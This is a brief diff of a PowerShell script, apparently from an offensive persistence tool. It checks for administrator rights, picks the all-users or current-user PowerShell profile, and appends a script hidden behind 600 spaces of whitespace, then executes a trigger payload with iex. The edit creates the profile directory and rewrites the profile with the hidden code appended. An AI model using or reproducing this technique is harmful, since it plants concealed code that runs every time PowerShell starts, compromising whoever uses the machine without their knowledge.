@@ -660,7 +660,8 @@ if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::G
 {$Prof=$PROFILE.AllUsersAllHosts;$Payload=ELEVATEDTRIGGER}
 else
 {$Prof=$PROFILE.CurrentUserAllHosts;$Payload=USERTRIGGER}
-' '*600+$Script.ToString()|Out-File $Prof -A -NoC -Fo
+mkdir (Split-Path -Parent $Prof)
+(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
 iex $Payload|Out-Null
 Write-Output $Payload}
 else
